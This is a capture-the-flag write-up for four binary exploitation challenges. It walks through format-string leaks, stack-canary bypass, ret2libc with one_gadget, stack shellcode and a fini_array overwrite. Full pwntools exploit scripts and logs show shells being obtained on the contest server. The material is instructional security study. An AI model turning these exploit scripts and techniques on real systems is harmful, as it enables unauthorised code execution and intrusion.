# **FOO BAR CTF - PWN**

## **Baby SSID**

### Description
> What are these signals we are recieving ?

We were given a binary file

### Solution
Let's run the binary file
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ ./ssid 
zsh: segmentation fault  ./ssid
```

Hmm. Let's check the decompiled binary output:
```c
void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  undefined8 in_stack_00000000;
  undefined auStack8 [8];
  
  __libc_start_main(FUN_00101160,in_stack_00000000,&stack0x00000008,FUN_00101320,FUN_00101390,
                    param_3,auStack8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```
```c
undefined8 FUN_00101160(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char acStack56 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  DAT_00104020 = (char *)malloc(100);
  __stream = fopen("./flag.txt","r");
  fgets(DAT_00104020,100,__stream);
  fclose(__stream);
  signal(0xb,FUN_00101300);
  fgets(acStack56,0x20,stdin);
  __printf_chk(1,acStack56);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

```c
void FUN_00101300(void)

{
  puts(DAT_00104020);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

It seems like we run into segmentation fault because there does not exist flag.txt file. Let's try again with flag.txt created

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ touch flag.txt
                                                                            
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ ./ssid        
test
test
```

Looks like the program echo back we input

Another thing to note that the flag.txt file content was stored at ``` DAT_00104020 ```and in the function ``` FUN_00101300 ``` we print out its content  

Now we want to trigger that function, but how? If we look into the function signal we would find what it's doing is basically using ``` FUN_00101300 ``` to signal-handle a signum : ``` 0xb ``` or the signum for ``` SIGSEV ```

Now all we have to do is trigger ``` SIGSEV ``` and ``` FUN_00101300 ``` will give us flag  

```c
  __printf_chk(1,acStack56);
```
It's a tell-tale sign of a format string vulnerability, we just need to input a bunch of "%s"  

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
└─$ nc chall.nitdgplug.org 30092
%s %s %s %s %s %s %s %s %s %s
(null)  %s %s %s %s %s %s %s %s %s %s
 GLUG{https://bit.ly/3vPXAuD}
```

The flag is : ``` GLUG{https://bit.ly/3vPXAuD} ```


## **Warmup**

### Description
> Can you help find the canary?

We only have binary file attached

### Solution
Let's run `checksec` on the file:

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
└─$ checksec chall
[*] '/home/kali/Desktop/pwn/foobar_ctf/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

That's a lot of protection. Using ghidra we can decompile the binary:

```c
void vuln(void)

{
  long in_FS_OFFSET;
  char local_98 [64];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Can you help find the Canary ?");
  fgets(local_98,0x40,stdin);
  printf(local_98);
  fflush(stdout);
  gets(local_58);
  puts(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can see that there is a format string vulnerability with:
```c
  printf(local_98);
```

That means we have the ability to read memory and arbitrary write. With that in mind, we can definitely leak the canary value and then buffer-overflow the `local_58` array bypassing the `__stack_chk_fail()`. We can defeat the stack canary  

```assembly
0x0000555555555218 <+15>:    mov    rax,QWORD PTR fs:0x28
0x0000555555555221 <+24>:    mov    QWORD PTR [rbp-0x8],rax
```

The canary was stored at `rbp-0x8`

```
gef➤  x/20gx $rsp
0x7fffffffde60: 0x4141414141414141      0x000a414141414141
0x7fffffffde70: 0x0000000000000040      0x00007ffff7fa76c0
0x7fffffffde80: 0x0000000000000000      0x00007ffff7e5a1e1
0x7fffffffde90: 0x0000000000000000      0x00007ffff7fa76c0
0x7fffffffdea0: 0x0000000000000000      0x0000000000000000
0x7fffffffdeb0: 0x00007ffff7fa84a0      0x00007ffff7e56d39
0x7fffffffdec0: 0x00007ffff7fa76c0      0x00007ffff7e4e5ed
0x7fffffffded0: 0x00005555555552e0      0x00007fffffffdf00
0x7fffffffdee0: 0x0000555555555120      0x7636f604229da000
0x7fffffffdef0: 0x00007fffffffdf00      0x00005555555552d5
gef➤  p $rbp-0x8
$1 = (void *) 0x7fffffffdee8
gef➤  x/gx $rbp -0x8
0x7fffffffdee8: 0x7636f604229da000
```

Testing a few times, i found out the offset of stack canary was at `"%23$llx"`

We can then leak the canary and buffer-overflow the return address but where do we return into? Remember that PIE and NX enabled  
My general attack was to leak `puts libc address` from the `GOT table` and then ret2libc. But in order to do that we need 3 things: `puts@plt` address, `puts@got.plt` address and a `ROP-Gadget` to prepare our `rdi` register before calling into `puts@plt` 

Because PIE was enabled we need to leak an address in the program and calculate with the offset to figure out those addresses we need. We will take advantage of this:
	
```
0x7fffffffded0: 0x00005555555552e0      0x00007fffffffdf00
0x7fffffffdee0: 0x0000555555555120      0x7636f604229da000
```
```
gef➤  x/2i 0x00005555555552e0
   0x5555555552e0 <__libc_csu_init>:    endbr64 
   0x5555555552e4 <__libc_csu_init+4>:  push   r15
```

We will leak the address of `__libc_csu_init` with the offset of `"%20$llx"` using format strings vulnerability  
We then use `ROPgadget` to find `pop rdi, ret`:
	
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
└─$ ROPgadget --binary chall | grep "rdi"
0x000000000000100b : fldcw word ptr [rdi] ; add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
0x0000000000001343 : pop rdi ; ret
```

We have these offsets to calculate:
	
```
0x1343 : pop rdi ; ret
0x12a5 <main+0>:     endbr64
0x10b0 <puts@plt>:   endbr64
0x3fa0 <puts@got.plt>:  0x0000000000001030
```
```
base_prog = init_addr - 0x12e0
puts_got = base_prog + 0x3fa0
puts_plt = base_prog + 0x10b0
main_addr = base_prog + 0x12a5
pop_rdi = base_prog + 0x1343
```

Now we build our payloads:

```
first_payload = "%23$llx%20$llx"
second_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
```

With leaked puts libc address we can get the libc of the program using libc-database which was `libc6_2.31-0ubuntu9.7_amd64.so`  
Then we use `one_gadget`:

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
└─$ one_gadget libc6_2.31-0ubuntu9.7_amd64.so  
0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL
```

Now we have everything to build our final payload  

```python
from pwn import *

context.log_level = 'debug'
LOCAL = False
REMOTE = True

if REMOTE:
	p = remote('chall.nitdgplug.org',30091)
if LOCAL:
	p = process('./chall')

# ---LEAK THE CANARY AND INIT_ADDR---
first_payload = "%23$llx%20$llx"
p.sendlineafter("Can you help find the Canary ?\n",first_payload)
canary = long(p.recv(16),16)
init_addr = long(p.recv(16),16)

# ---CALCULATE ADDR WITH OFFSET---
base_prog = init_addr - 0x12e0
puts_got = base_prog + 0x3fa0
puts_plt = base_prog + 0x10b0
main_addr = base_prog + 0x12a5
pop_rdi = base_prog + 0x1343

# ---BUFFER OVERFLOW PAYLOAD---
sec_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(sec_payload)
p.recv(0x48)
temp = p.recv(8)
s1 = ""
for x in temp:
	if ( x != "\n"):
		s1 += x
s1 = s1 + chr(0) + chr(0)
puts_libc = u64(s1)

# ---CALCULATE LIBC BASE ADDRESS---
log.info("Puts Libc Address: " + hex(puts_libc))
libc_base = puts_libc - 0x84450
one_gadget = libc_base + 0xe3b31

p.sendlineafter("Can you help find the Canary ?\n","%23$llx")
canary = long(p.recv(16),16)

# ---RET2LIBC---
payload = "A"*72 + p64(canary) + p64(0x0) + p64(one_gadget)
p.sendline(payload)
p.interactive()
```

OUTPUT:
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
└─$ python2 solve.py                          
[+] Opening connection to chall.nitdgplug.org on port 30091: Done
[DEBUG] Received 0x1e bytes:
    'Can you help find the Canary ?'
[DEBUG] Received 0x1 bytes:
    '\n'
[DEBUG] Sent 0xf bytes:
    '%23$llx%20$llx\n'
[DEBUG] Received 0x1d bytes:
    '83464ac6a13fb60055f794b212e0\n'
[DEBUG] Sent 0x79 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 b6 3f a1  c6 4a 46 83  │AAAA│AAAA│··?·│·JF·│
    00000050  00 00 00 00  00 00 00 00  43 13 b2 94  f7 55 00 00  │····│····│C···│·U··│
    00000060  a0 3f b2 94  f7 55 00 00  b0 10 b2 94  f7 55 00 00  │·?··│·U··│····│·U··│
    00000070  a5 12 b2 94  f7 55 00 00  0a                        │····│·U··│·│
    00000079
[DEBUG] Received 0x48 bytes:
    'A' * 0x48
[DEBUG] Received 0x27 bytes:
    00000000  0a 50 a4 fb  92 b2 7f 0a  43 61 6e 20  79 6f 75 20  │·P··│····│Can │you │
    00000010  68 65 6c 70  20 66 69 6e  64 20 74 68  65 20 43 61  │help│ fin│d th│e Ca│
    00000020  6e 61 72 79  20 3f 0a                               │nary│ ?·│
    00000027
[*] Puts Libc Address: 0x7fb292fba450
[DEBUG] Sent 0x8 bytes:
    '%23$llx\n'
[DEBUG] Received 0x11 bytes:
    '83464ac6a13fb600\n'
[DEBUG] Sent 0x61 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 b6 3f a1  c6 4a 46 83  │AAAA│AAAA│··?·│·JF·│
    00000050  00 00 00 00  00 00 00 00  31 9b 01 93  b2 7f 00 00  │····│····│1···│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode

[DEBUG] Received 0x48 bytes:
    'A' * 0x48
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[DEBUG] Received 0x1 bytes:
    '\n'

$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x6 bytes:
    'error\n'
error
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xf bytes:
    'chall\n'
    'flag.txt\n'
chall
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x38 bytes:
    "GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}"
GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}$
```

The flag is: `GLUG{1f_y0u_don't_t4k3_r1sk5_y0u_c4n't_cr3at3_4_future!}`


## **Hunter**

### Description
> When the hunters become the hunted

We were given a binary file

### Solution

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
└─$ checksec Hunters
[*] '/home/kali/Desktop/pwn/foobar_ctf/hunter/Hunters'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Decompile the binary with Ghidra:

```c
undefined8 main(void)

{
  long lVar1;
  undefined8 *puVar2;
  undefined8 *puVar3;
  long in_FS_OFFSET;
  byte bVar4;
  undefined local_248 [32];
  undefined local_228 [32];
  undefined8 local_208 [63];
  long local_10;
  
  bVar4 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  printf("What is your name hunter? : ");
  __isoc99_scanf(&DAT_00102025,local_248);
  puVar2 = (undefined8 *)
           "I am the hunter, I am the great unknownOnly my love can conquerI am the, I am the hunter  (I am the hunter)I am the hunter, into the wild, we goGive up your heart, surrender\'Cau se I am the, I am the hunter (I am the, hey!)We\'ve been on this roadTo a place that, one  day, we\'ll knowAdventure to the other side (I am the, I am the)Searching high and low f or the treasure deep in your soulThe fortune teller\'s always rightGot them red eyes in t he nightLike a panther, outta sightGonna sing my battle cry"
  ;
  puVar3 = local_208;
  for (lVar1 = 0x3e; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + (ulong)bVar4 * -2 + 1;
    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
  }
  *(undefined4 *)puVar3 = *(undefined4 *)puVar2;
  printf("What is your most precious possession? : ",puVar2,(long)puVar2 + 4);
  __isoc99_scanf(&DAT_0010205a,local_228);
  (*(code *)local_248)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
We can immediately see that we have code execution with:

```c
(*(code *)local_248)();
```

`local_248` was our first input, and we also have control of `local_228`. It's quite easy to figure out that with NX disabled we can put our shell code onto the stack and execute it. All we need to do is call syscall, and prepare our registers: `rax = 0x3b` , `rsi=0x0`, `rdx=0x0` and `rdi = address that contains /bin/sh`.

We also have to make sure that our payload does not contain white space like: '\r', '\n', '\t'

My first attempt at this challenge was basically that. But i failed to construct a payload without white space thus it failed without me, at the time, knowing what the problem was. After that, I had a very different approach which was quite unnecessarily long

My idea was quite simple: I will leak libc address then using ret2libc. Again very similar to Warmup I will use address that i can access on the stack to calculate every other address like: `printf@plt`, `printf@got.plt`, `main_addr`,..etc

Using the return address that was pushed onto the stack:
```
gef➤  x/10gx $rsp
0x7fffffffdc98: 0x0000555555555297      0x4141414141414141
0x7fffffffdca8: 0x0000000000000041      0x0000000000000001
0x7fffffffdcb8: 0x0000000103ae75f6      0x4141414141414141
0x7fffffffdcc8: 0x0000000000414141      0x0000012100000000
0x7fffffffdcd8: 0x0000000000000000      0x656874206d612049
```
```assembly
0x0000555555555295 <+236>:   call   rdx
0x0000555555555297 <+238>:   mov    eax,0x0
```

And we have these offsets:

```
0x1295 <+236>:   call   rdx
0x1297 <+238>:   mov    eax,0x0
0x11a9 <main+0>:     endbr64
0x10a0 <printf@plt>: endbr64
0x3fc8 <printf@got.plt>:        0x0000000000001050
```

My first payload was: 

```
payload = "\x5B\x48\x31\xC0\xB0\xEE\x48\x29\xC3\x53\x49\x89\xDD\xC3"
sec_payload = "AAAA"
```

```
0:  5b                      pop    rbx
1:  48 31 c0                xor    rax,rax
4:  b0 ee                   mov    al,0xee
6:  48 29 c3                sub    rbx,rax
9:  53                      push   rbx
a:  49 89 dd                mov    r13,rbx
d:  c3                      ret
```
`rbx` will have addresss of `0x1297 <+238>:   mov    eax,0x0` then we calculate with the offset

`r13 = main_addr`

With this we can cycle over the main function over and over again

```
payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
```

```
0:  4d 89 ee                mov    r14,r13
3:  48 31 c0                xor    rax,rax
6:  66 b8 1f 2e             mov    ax,0x2e1f
a:  49 01 c6                add    r14,rax
d:  41 55                   push   r13
f:  c3                      ret
```
`r14 = printf@got.plt_addr`

```
payload = "\x4D\x89\xF7\x48\x31\xC0\x66\xB8\x28\x2F\x49\x29\xC7\x41\x55\xC3"
```

```
0:  4d 89 f7                mov    r15,r14
3:  48 31 c0                xor    rax,rax
6:  66 b8 28 2f             mov    ax,0x2f28
a:  49 29 c7                sub    r15,rax
d:  41 55                   push   r13
f:  c3                      ret
```
`r15= printf@plt_addr`

```
payload = "\x4C\x89\xF7\x41\xFF\xD7\x41\x55\xC3"
```

```
0:  4c 89 f7                mov    rdi,r14
3:  41 ff d7                call   r15
6:  41 55                   push   r13
8:  c3                      ret
```
Call puts(`r14=printf@got.plt_addr`)

After that all we need to do is find libc version then ret2libc with one_gadget

```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
└─$ one_gadget libc6_2.23-0ubuntu11.2_amd64.so
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
```

```
payload1 = "\x58"*5 + "\x48\x31\xC0\xC3"
payload2 = p64(one_gadget)
```

```
0:  58                      pop    rax
1:  58                      pop    rax
2:  58                      pop    rax
3:  58                      pop    rax
4:  58                      pop    rax
5:  48 31 c0                xor    rax,rax
8:  c3                      ret
```

Because our `payload1` and `payload2` are quite close to each other on the stack, we can pop our `rsp` into our `payload2`, which holds the address of our `one_gadget`, then we return ( And set rax = 0 to satisfy the one_gadget constraints)

Here's my script:
```python
from pwn import *

LOCAL = False
REMOTE = True
context.arch = 'amd64'
context.endian = 'little'

if REMOTE:
	p = remote('chall.nitdgplug.org',30090)
if LOCAL:
	#p = process('./Hunters')
	p = gdb.debug('./Hunters')
	log.info("PID: " + str(p.pid))
	
# ---SET R13 = MAIN_ADDR---
payload = "\x5B\x48\x31\xC0\xB0\xEE\x48\x29\xC3\x53\x49\x89\xDD\xC3"
log.info("Sending payload:\n{}".format(hexdump(payload)))
log.info("PAYLOAD:\n{}".format(disasm(payload)))
sec_payload = "AAAA"
p.sendlineafter("What is your name hunter? : ",payload)
p.sendlineafter("What is your most precious possession? : ",sec_payload)

# ---SET R14 = PUTS_GOT.PLT_ADDR---
payload = "\x4D\x89\xEE\x48\x31\xC0\x66\xB8\x1F\x2E\x49\x01\xC6\x41\x55\xC3"
log.info("Sending payload:\n{}".format(hexdump(payload)))
log.info("PAYLOAD:\n{}".format(disasm(payload)))
p.sendlineafter("What is your name hunter? : ",payload)
p.sendlineafter("What is your most precious possession? : ",sec_payload)

# ---SET R15 = PUTS.PLT_ADDR---
payload = "\x4D\x89\xF7\x48\x31\xC0\x66\xB8\x28\x2F\x49\x29\xC7\x41\x55\xC3"
log.info("Sending payload:\n{}".format(hexdump(payload)))
log.info("PAYLOAD:\n{}".format(disasm(payload)))
p.sendlineafter("What is your name hunter? : ",payload)
p.sendlineafter("What is your most precious possession? : ",sec_payload)

# ---CALL PUTS(PUTS_GOT.PLT_ADDR)---
payload = "\x4C\x89\xF7\x41\xFF\xD7\x41\x55\xC3"
log.info("Sending payload:\n{}".format(hexdump(payload)))
log.info("PAYLOAD:\n{}".format(disasm(payload)))
p.sendlineafter("What is your name hunter? : ",payload)
p.sendlineafter("What is your most precious possession? : ",sec_payload)
printf_libc = p.recv(6)
printf_libc = printf_libc + chr(0) + chr(0)
printf_libc = u64(printf_libc)
log.info("Printf Libc Address: " + hex(printf_libc))

pause()
# ---CALCULATE BASE LIBC ADDRESS WITH OFFSET---
base_libc = printf_libc - 0x55810
one_gadget = base_libc + 0x45226

# ---POP RSP INTO OUR PAYLOAD2 THEN RET2LIBC---
payload1 = "\x58"*5 + "\x48\x31\xC0\xC3"
log.info("Sending payload:\n{}".format(hexdump(payload)))
payload2 = p64(one_gadget)
p.sendlineafter("What is your name hunter? : ",payload1)
p.sendlineafter("What is your most precious possession? : ",payload2)
p.interactive()
```

OUTPUT:
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/hunter]
└─$ python2 solve.py
[+] Opening connection to chall.nitdgplug.org on port 30090: Done
[*] Sending payload:
    00000000  5b 48 31 c0  b0 ee 48 29  c3 53 49 89  dd c3        │[H1·│··H)│·SI·│··│
    0000000e
[*] PAYLOAD:
       0:   5b                      pop    rbx
       1:   48 31 c0                xor    rax, rax
       4:   b0 ee                   mov    al, 0xee
       6:   48 29 c3                sub    rbx, rax
       9:   53                      push   rbx
       a:   49 89 dd                mov    r13, rbx
       d:   c3                      ret
[*] Sending payload:
    00000000  4d 89 ee 48  31 c0 66 b8  1f 2e 49 01  c6 41 55 c3  │M··H│1·f·│·.I·│·AU·│
    00000010
[*] PAYLOAD:
       0:   4d 89 ee                mov    r14, r13
       3:   48 31 c0                xor    rax, rax
       6:   66 b8 1f 2e             mov    ax, 0x2e1f
       a:   49 01 c6                add    r14, rax
       d:   41 55                   push   r13
       f:   c3                      ret
[*] Sending payload:
    00000000  4d 89 f7 48  31 c0 66 b8  28 2f 49 29  c7 41 55 c3  │M··H│1·f·│(/I)│·AU·│
    00000010
[*] PAYLOAD:
       0:   4d 89 f7                mov    r15, r14
       3:   48 31 c0                xor    rax, rax
       6:   66 b8 28 2f             mov    ax, 0x2f28
       a:   49 29 c7                sub    r15, rax
       d:   41 55                   push   r13
       f:   c3                      ret
[*] Sending payload:
    00000000  4c 89 f7 41  ff d7 41 55  c3                        │L··A│··AU│·│
    00000009
[*] PAYLOAD:
       0:   4c 89 f7                mov    rdi, r14
       3:   41 ff d7                call   r15
       6:   41 55                   push   r13
       8:   c3                      ret
[*] Printf Libc Address: 0x7f237928a810
[*] Paused (press any to continue)
[*] Sending payload:
    00000000  4c 89 f7 41  ff d7 41 55  c3                        │L··A│··AU│·│
    00000009
[*] Switching to interactive mode
$ ls
Hunters
Hunters.c
bin
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
GLUG{egg_HUnTER_cH@MpIoN}
```

The flag is: `GLUG{egg_HUnTER_cH@MpIoN}`


## **One Punch**

### Description
> Life became boring after I could defeat anyone in a single shot 

We were given a binary file

### Solution

Run checksec on file:
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/one_punch]
└─$ checksec chall_one
[*] '/home/kali/Desktop/pwn/foobar_ctf/one_punch/chall_one'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Decompile with Ghidra:
```c
undefined8 vuln(void)

{
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("YOU ONLY GET ONE CHANCE SO....");
  puts(&DAT_00402027);
  fgets(local_58,0x7c,stdin);
  printf(local_58);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We can already see a format string vulnerability:

```c
printf(local_58);
```

And potentially a buffer-overflow?
```c
char local_58 [72];
```
```c
fgets(local_58,0x7c,stdin);
```

Without PIE enabled, it became quite trivial to leak puts libc address, and with format string vulnerability we can also leak the canary value. With that in mind, my attack was to overwrite `fini_array` to our `main_addr`, leak `puts_libc_address`, leak `canary` in my first payload

We have these addresses:
```
fini = 0x4031e0
main_addr = 0x00401292
puts_got = 0x4033e0
```
Constructing our first payload:
```python
payload = "%12$4754x%12$hn|EOF%15$llx%11$s".ljust(40,"A") + p64(puts_got) + p64(fini)
```
`canary` had the offset of `%15$llx`

With leaked puts libc address, we get the libc version. Then on our second run of main function, we will perform a ret2libc attack with one_gadget (similar to the last 2 challenges) and the canary value we leaked


Here's my script:
```python
from pwn import *

context.log_level = 'debug'
LOCAL = False
REMOTE = True

if REMOTE:
	p = remote('chall.nitdgplug.org',30095)
if LOCAL:
	#p = process('./chall_one_patched')
	p = gdb.debug('./chall_one_patched')
	log.info("PID: " + str(p.pid))

fini = 0x4031e0
main_addr = 0x00401292
puts_got = 0x4033e0

# ---OVERWRITE FINI_ARRAY, LEAK CANARY, LEAK PUTS_LIBC_ADDR---
payload = "%12$4754x%12$hn|EOF%15$llx%11$s".ljust(40,"A") + p64(puts_got) + p64(fini) 
p.sendlineafter("|\n",payload)

p.recvuntil("|EOF")
canary = long(p.recv(16),16)
log.info("Canary: " + hex(canary))
tmp = (p.recv(8))
s1 = ""
for x in tmp:
	if(x != "A"):
		s1 += x
s1 += chr(0) + chr(0)

puts_libc = u64(s1)
base_libc = puts_libc - 0x84450
log.info("Puts libc address: " + hex(puts_libc))
log.info("Base libc address: " + hex(base_libc))

# ---RET2LIBC---
one_gadget = base_libc + 0xe3b2e
payload = "A"*72 + p64(canary) + p64(0) + p64(one_gadget)
p.sendline(payload)
p.interactive() 
```

OUTPUT:
```console
┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/one_punch]
└─$ python2 solve.py
[+] Opening connection to chall.nitdgplug.org on port 30095: Done
[DEBUG] Received 0x1e bytes:
    'YOU ONLY GET ONE CHANCE SO....'
[DEBUG] Received 0x1c bytes:
    00000000  0a 7c 20 f0  9f 91 8a 20  50 75 6e 63  68 20 68 61  │·| ·│··· │Punc│h ha│
    00000010  72 64 65 72  20 f0 9f 91  8a 20 7c 0a               │rder│ ···│· |·│
    0000001c
[DEBUG] Sent 0x39 bytes:
    00000000  25 31 32 24  34 37 35 34  78 25 31 32  24 68 6e 7c  │%12$│4754│x%12│$hn|│
    00000010  45 4f 46 25  31 35 24 6c  6c 78 25 31  31 24 73 41  │EOF%│15$l│lx%1│1$sA│
    00000020  41 41 41 41  41 41 41 41  e0 33 40 00  00 00 00 00  │AAAA│AAAA│·3@·│····│
    00000030  e0 31 40 00  00 00 00 00  0a                        │·1@·│····│·│
    00000039
[DEBUG] Received 0x1000 bytes:
    ' ' * 0x1000
[DEBUG] Received 0x2f2 bytes:
    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    00000280  20 20 20 20  20 20 20 20  20 20 20 20  34 30 33 31  │    │    │    │4031│
    00000290  65 30 7c 45  4f 46 38 30  32 61 65 64  39 33 37 35  │e0|E│OF80│2aed│9375│
    000002a0  63 34 64 66  30 30 50 b4  3e 6e aa 7f  41 41 41 41  │c4df│00P·│>n··│AAAA│
    000002b0  41 41 41 41  41 e0 33 40  59 4f 55 20  4f 4e 4c 59  │AAAA│A·3@│YOU │ONLY│
    000002c0  20 47 45 54  20 4f 4e 45  20 43 48 41  4e 43 45 20  │ GET│ ONE│ CHA│NCE │
    000002d0  53 4f 2e 2e  2e 2e 0a 7c  20 f0 9f 91  8a 20 50 75  │SO..│..·|│ ···│· Pu│
    000002e0  6e 63 68 20  68 61 72 64  65 72 20 f0  9f 91 8a 20  │nch │hard│er ·│··· │
    000002f0  7c 0a                                               │|·│
    000002f2
[*] Canary: 0x802aed9375c4df00
[*] Puts libc address: 0x7faa6e3eb450
[*] Base libc address: 0x7faa6e367000
[DEBUG] Sent 0x61 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  00 df c4 75  93 ed 2a 80  │AAAA│AAAA│···u│··*·│
    00000050  00 00 00 00  00 00 00 00  2e ab 44 6e  aa 7f 00 00  │····│····│.·Dn│····│
    00000060  0a                                                  │·│
    00000061
[*] Switching to interactive mode
AAAAAAA�3@YOU ONLY GET ONE CHANCE SO....
| 👊 Punch harder 👊 |
[DEBUG] Received 0x48 bytes:
    'A' * 0x48
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xf bytes:
    'chall\n'
    'flag.txt\n'
chall
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x2d bytes:
    'GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}\n'
GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}
```

The flag is: `GLUG{0ne_5t3p_On3_Punch_On3_r0und_4t_4_t1m3}`


















